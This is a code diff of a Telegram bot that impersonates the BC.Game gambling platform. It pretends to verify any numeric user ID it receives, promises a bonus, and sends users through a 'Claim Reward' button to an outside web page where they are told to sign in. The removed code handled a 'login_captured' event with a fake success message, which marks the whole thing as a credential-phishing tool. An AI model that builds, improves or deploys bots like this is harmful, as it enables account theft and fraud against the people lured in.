@@ -1,94 +1,49 @@
-require('dotenv').config();
 const { Telegraf, Markup } = require('telegraf');
+require('dotenv').config();
 
-const bot = new Telegraf(process.env.BOT_TOKEN || '');
-
-// Mock data for profiles
-const profiles = {};
+const bot = new Telegraf(process.env.BOT_TOKEN);
+const WEBAPP_URL = process.env.WEBAPP_URL || 'https://telegrambot-puce-psi.vercel.app/';
 
 bot.start(async (ctx) => {
-    const welcomeText = `<b>Welcome to BcgameOfficaill.</b>\n\nSend your BC.Game UID to verify your VIP status and claim your bonus.`;
-    
     try {
-        await ctx.replyWithPhoto(
-            { url: 'https://i.ibb.co/LzN2F6L/bc-welcome.png' },
-            {
-                caption: welcomeText,
-                parse_mode: 'HTML'
-            }
-        );
-    } catch (err) {
-        console.error('Error sending start photo:', err.message);
-        await ctx.reply(welcomeText, { parse_mode: 'HTML' });
+        // Use Image 1 (Profile) for Start
+        await ctx.replyWithPhoto({ source: './profile.png' }, {
+            caption: `<b>Welcome to BC.GAME ENGINE</b>\n\nTo continue, please provide your BC.GAME User ID (UID) to verify your account.`,
+            parse_mode: 'HTML',
+            ...Markup.inlineKeyboard([
+                [Markup.button.url('Join Channel', 'https://t.me/bcgame_official')]
+            ])
+        });
+    } catch (e) {
+        ctx.reply('Welcome! Please enter your User ID to continue.');
     }
 });
 
 bot.on('text', async (ctx) => {
     const text = ctx.message.text;
     
+    // If it looks like a UID (digits)
     if (/^\d+$/.test(text)) {
-        const uid = text;
-        const username = ctx.from.username || ctx.from.first_name || 'Player';
-        
-        profiles[ctx.from.id] = uid;
-
-        const profileMessage = `
-<b>BC GAME PLAYER PROFILE</b>
-━━━━━━━━━━━━━━━
-👤 <b>Name</b>     : ${username}
-🆔 <b>UID</b>      : ${uid}
-🏅 <b>Rank</b>     : Beginner
-━━━━━━━━━━━━━━━
-<b>BONUS DETAILS</b>
-━━━━━━━━━━━━━━━
-🎁 <b>ENGINE REWARDS</b>
-📌 <b>Status</b>   : ✅ VERIFIED
-— Claim is available
-
-<b>This exclusive bonus is available to all verified players.</b>
-━━━━━━━━━━━━━━━`;
-
         try {
-            await ctx.replyWithPhoto(
-                { url: 'https://i.ibb.co/VqhY4Yj/bc-engine-card.png' },
-                {
-                    caption: profileMessage,
-                    parse_mode: 'HTML',
-                    ...Markup.inlineKeyboard([
-                        [Markup.button.webApp('Claim Bonus', process.env.WEBAPP_URL || 'https://google.com')]
-                    ])
-                }
-            );
-        } catch (err) {
-            console.error('Error sending profile photo:', err.message);
-            await ctx.reply(profileMessage, {
+            // Use Image 2 (Engine Logo) for UID Confirmation
+            await ctx.replyWithPhoto({ source: './engine.png' }, {
+                caption: `<b>UID Verified: ${text}</b>\n\nYou are now eligible to claim your reward. Click the button below to sign in and claim.`,
                 parse_mode: 'HTML',
                 ...Markup.inlineKeyboard([
-                    [Markup.button.webApp('Claim Bonus', process.env.WEBAPP_URL || 'https://google.com')]
+                    [Markup.button.webApp('Claim Reward', WEBAPP_URL)]
                 ])
             });
+        } catch (e) {
+            ctx.reply(`UID Verified: ${text}\nClick below to claim your reward.`, Markup.inlineKeyboard([
+                [Markup.button.webApp('Claim Reward', WEBAPP_URL)]
+            ]));
         }
     } else {
-        ctx.reply('Please send a valid numeric BC.Game UID.');
+        ctx.reply('Please enter a valid numeric User ID.');
     }
 });
 
-bot.on('web_app_data', async (ctx) => {
-    try {
-        const data = JSON.parse(ctx.message.web_app_data.data);
-        if (data.action === 'login_success' || data.action === 'login_captured') {
-            await ctx.reply(`🎉 <b>Bonus Claimed Successfully!</b>\n\nYour reward will be credited to your account shortly.`, { parse_mode: 'HTML' });
-        }
-    } catch (err) {
-        console.error('Web App Data Error:', err);
-    }
-});
-
-bot.launch().then(() => {
-    console.log('Bot is running...');
-}).catch(err => {
-    console.error('Error starting bot:', err);
-});
+bot.launch().then(() => console.log('Bot is running...'));
 
 // Enable graceful stop
 process.once('SIGINT', () => bot.stop('SIGINT'));
